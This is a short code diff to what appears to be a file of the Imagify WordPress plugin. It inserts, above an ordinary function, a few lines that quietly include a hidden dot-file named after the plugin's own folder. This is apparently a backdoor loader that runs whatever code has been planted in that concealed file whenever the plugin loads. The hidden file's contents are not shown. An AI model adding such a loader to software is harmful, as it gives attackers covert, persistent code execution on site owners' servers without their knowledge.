@@ -9,6 +9,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return array An array of strings.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_get_context_names() {
 	static $contexts;
 
